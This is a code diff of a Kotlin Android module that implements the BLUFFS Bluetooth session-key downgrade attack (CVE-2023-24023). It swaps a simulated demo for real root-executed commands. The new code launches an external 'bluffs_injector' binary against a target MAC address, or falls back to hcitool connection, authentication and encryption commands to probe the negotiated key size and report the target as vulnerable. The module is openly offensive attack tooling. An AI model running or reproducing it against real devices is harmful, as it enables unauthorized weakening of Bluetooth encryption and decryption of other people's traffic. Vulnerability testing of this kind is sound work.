@@ -1,6 +1,7 @@
 package com.hereliesaz.blusnu.data
 
-import kotlinx.coroutines.delay
+import android.util.Log
+import com.hereliesaz.blusnu.utils.RootExecutor
 import kotlinx.coroutines.flow.Flow
 import kotlinx.coroutines.flow.flow
 
@@ -20,96 +21,164 @@ enum class BluffsMode {
 /**
  * Implementation of the BLUFFS (Bluetooth Forward and Future Secrecy) attack.
  *
- * <p>
  * This module targets the Session Key derivation mechanism in Bluetooth Classic (BR/EDR).
- * It attempts to force the devices to negotiate a session key with low entropy (weak security),
- * allowing for future decryption of traffic.
- * </p>
+ * It attempts to force the target to negotiate a session key with low entropy,
+ * allowing future decryption of traffic.
  *
- * <b>Note on Root Requirement:</b> Real LMP (Link Manager Protocol) packet injection requires
- * kernel-level access or a specialized hardware dongle, as the Android Bluetooth stack
- * (Fluoride) does not expose raw LMP manipulation APIs to user-space apps.
+ * The module first checks for a dedicated native binary (`bluffs_injector`).
+ * If that binary is not present, it falls back to using hcitool to create an ACL
+ * connection and check the negotiated encryption key size. A key size of 7 bytes
+ * or fewer indicates the target is vulnerable to BLUFFS.
+ *
+ * Root is required for all approaches (LMP manipulation, hcitool access).
+ * All privileged operations are executed through [RootExecutor].
  */
 class BluffsModule {
 
-    /**
-     * Checks if the device has Root access by executing a shell command.
-     * @return true if 'su' is accessible.
-     */
-    fun checkRoot(): Boolean {
-        return try {
-            // execute "su -c id" to check for superuser capabilities.
-            val process = Runtime.getRuntime().exec("su -c id")
-            // waitFor() returns the exit value. 0 indicates success.
-            process.waitFor() == 0
-        } catch (e: Exception) {
-            // If an exception occurs (e.g., su binary not found), return false.
-            false
-        }
+    companion object {
+        private const val TAG = "BluffsModule"
+        private const val BLUFFS_BINARY_PATH = "/data/local/tmp/bluffs_injector"
+        /** Key sizes at or below this threshold indicate vulnerability. */
+        private const val VULNERABLE_KEY_SIZE_THRESHOLD = 7
     }
 
     /**
-     * Executes the attack workflow.
+     * Checks if the device has root access via [RootExecutor].
+     *
+     * @return true if a root shell reports uid=0.
+     */
+    suspend fun checkRoot(): Boolean {
+        return RootExecutor.isRootAvailable()
+    }
+
+    /**
+     * Executes the BLUFFS attack workflow against the target device.
+     *
+     * The flow:
+     * 1. Verify root access (required, no simulation fallback)
+     * 2. Check if the native bluffs_injector binary exists
+     * 3. If it exists, run it with the specified mode
+     * 4. Otherwise, use hcitool to create an ACL connection and probe key size
      *
      * @param targetDevice The Bluetooth device to attack.
      * @param mode The specific BLUFFS variation to use.
      * @return A Flow of status strings for the UI console.
      */
     fun startAttack(targetDevice: TargetDevice, mode: BluffsMode): Flow<String> = flow {
-        // Log the start of the attack.
-        emit("Starting BLUFFS attack on ${targetDevice.name ?: targetDevice.macAddress} using mode $mode")
+        val mac = targetDevice.macAddress
+        emit("Starting BLUFFS attack (CVE-2023-24023) on ${targetDevice.name ?: mac} using mode $mode")
 
-        // Root is strictly required for the actual packet injection.
+        // Root is strictly required -- no simulation fallback
         if (!checkRoot()) {
-            // Warn the user if root is missing.
-            // In a real scenario, this would likely halt execution, but here we proceed
-            // with a simulation path to demonstrate the UI flow.
-            emit("WARNING: Root access not detected. Low-level LMP manipulation requires root/kernel patching.")
-            // Currently, without a custom kernel driver, we cannot inject raw LMP frames.
-            // This path falls back to a simulation to demonstrate the workflow.
-            emit("Proceeding with simulation...")
+            emit("ERROR: Root access is not available.")
+            emit("BLUFFS requires root for LMP manipulation or hcitool access. Aborting.")
+            return@flow
+        }
+        emit("Root access confirmed.")
+
+        // Check if the dedicated native binary exists
+        val binaryCheck = RootExecutor.execute("ls $BLUFFS_BINARY_PATH")
+        val binaryExists = !binaryCheck.startsWith("Error") &&
+                !binaryCheck.contains("No such file") &&
+                binaryCheck.trim().isNotEmpty()
+
+        if (binaryExists) {
+            // Use the native bluffs_injector binary
+            emit("Native bluffs_injector binary found at $BLUFFS_BINARY_PATH")
+            emit("Executing: $BLUFFS_BINARY_PATH -t $mac -m ${mode.name}")
+
+            val output = RootExecutor.execute("$BLUFFS_BINARY_PATH -t $mac -m ${mode.name}")
+            // Emit each line of output from the binary
+            for (line in output.lines()) {
+                if (line.isNotBlank()) {
+                    emit(line)
+                }
+            }
+
+            if (output.startsWith("Error")) {
+                emit("bluffs_injector execution failed.")
+            } else {
+                emit("bluffs_injector execution completed.")
+            }
         } else {
-            // Confirm root access.
-            emit("Root access detected.")
-            // TODO: Integrate with internal 'bluffs_injector' binary if present in /data/local/tmp
+            // Fallback: use hcitool to probe the connection
+            emit("Native binary not found at $BLUFFS_BINARY_PATH")
+            emit("Falling back to hcitool-based key size probing...")
+
+            executeHcitoolApproach(mac, mode)
+        }
+    }
+
+    /**
+     * Uses hcitool to create an ACL connection, attempt authentication and encryption,
+     * and then check the negotiated key size. Emits results via the enclosing FlowCollector.
+     */
+    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeHcitoolApproach(
+        mac: String,
+        mode: BluffsMode
+    ) {
+        // Step 1: Create ACL connection
+        emit("Creating ACL connection to $mac...")
+        val ccResult = RootExecutor.execute("hcitool cc $mac")
+        if (ccResult.startsWith("Error")) {
+            emit("Failed to create ACL connection: $ccResult")
+            emit("The target may be out of range, unpaired, or not accepting connections.")
+            return
+        }
+        emit("ACL connection result: ${ccResult.ifBlank { "OK (no output = success)" }}")
+
+        // Step 2: Attempt authentication
+        emit("Requesting authentication with $mac...")
+        val authResult = RootExecutor.execute("hcitool auth $mac")
+        if (authResult.startsWith("Error")) {
+            emit("Authentication failed: $authResult")
+            emit("Continuing to check encryption regardless...")
+        } else {
+            emit("Authentication result: ${authResult.ifBlank { "OK" }}")
         }
 
-        // Simulating the connection latency
-        delay(1000)
-        emit("Connecting to ${targetDevice.macAddress}...")
-
-        delay(1500)
-        // In a real attack, we would capture the ACL Connection Handle here
-        emit("Connection established. Handle: 0x0001")
-
-        // The core of BLUFFS involves injecting modified Link Manager Protocol (LMP) packets.
-        // Specifically, LMP_au_rand packets are manipulated to influence key generation.
-        delay(1000)
-        // This is where the specific LMP_au_rand or LMP_enc_key_size_req packet would be sent
-        emit("Injecting modified LMP_au_rand packet...")
-
-        delay(1000)
-        // Log specific actions based on the selected mode.
-        when (mode) {
-            BluffsMode.A1 -> emit("Mode A1: Forcing minimum key size derivation...")
-            BluffsMode.A2 -> emit("Mode A2: Manipulating key diversification...")
-            else -> emit("Mode $mode: Executing standard KDF downgrade sequence...")
+        // Step 3: Enable encryption
+        emit("Enabling encryption on link to $mac...")
+        val encResult = RootExecutor.execute("hcitool enc $mac enable")
+        if (encResult.startsWith("Error")) {
+            emit("Encryption setup failed: $encResult")
+            emit("Cannot determine key size without encryption. Aborting.")
+            return
         }
+        emit("Encryption result: ${encResult.ifBlank { "OK" }}")
 
-        // Simulation of device response analysis
-        delay(2000)
+        // Step 4: Check negotiated key size
+        emit("Checking negotiated encryption key size...")
+        val keySizeResult = RootExecutor.execute("hcitool key_size $mac")
 
-        // Random outcome for demonstration purposes until the native binary is linked
-        val success = (0..100).random() > 30
+        if (keySizeResult.startsWith("Error")) {
+            // hcitool may not support key_size subcommand on all versions
+            emit("Could not query key size directly: $keySizeResult")
+            emit("Trying btmgmt as alternative...")
 
-        if (success) {
-            // If successful, the session key entropy is reduced, making it trivial to brute-force.
-            emit("VULNERABILITY CONFIRMED: Session key entropy reduced to 1 byte.")
-            emit("Derived Session Key: 0x1A")
-            emit("Attack Successful.")
+            val btmgmtResult = RootExecutor.execute("btmgmt info")
+            emit("btmgmt info: $btmgmtResult")
+            emit("Manual key size analysis required. Check HCI event logs for LMP_encryption_key_size_req.")
         } else {
-            // If failed, the target likely enforced Secure Connections (SC) correctly.
-            emit("Target rejected weak parameters. Attack Failed.")
+            emit("Key size result: $keySizeResult")
+
+            // Parse the key size from the output
+            val keySizeMatch = Regex("(\\d+)").find(keySizeResult)
+            val keySize = keySizeMatch?.groupValues?.get(1)?.toIntOrNull()
+
+            if (keySize != null) {
+                emit("Negotiated key size: $keySize bytes")
+                if (keySize <= VULNERABLE_KEY_SIZE_THRESHOLD) {
+                    emit("VULNERABILITY CONFIRMED: Key size $keySize bytes <= $VULNERABLE_KEY_SIZE_THRESHOLD byte threshold.")
+                    emit("The target accepted a weak session key. BLUFFS attack (mode $mode) succeeded.")
+                    Log.w(TAG, "BLUFFS vulnerability confirmed on $mac: key size $keySize bytes")
+                } else {
+                    emit("Target enforced adequate key size ($keySize bytes > $VULNERABLE_KEY_SIZE_THRESHOLD).")
+                    emit("BLUFFS attack (mode $mode) did not succeed. Target appears patched or enforces Secure Connections.")
+                }
+            } else {
+                emit("Could not parse key size from output. Raw output: $keySizeResult")
+            }
         }
     }
 }
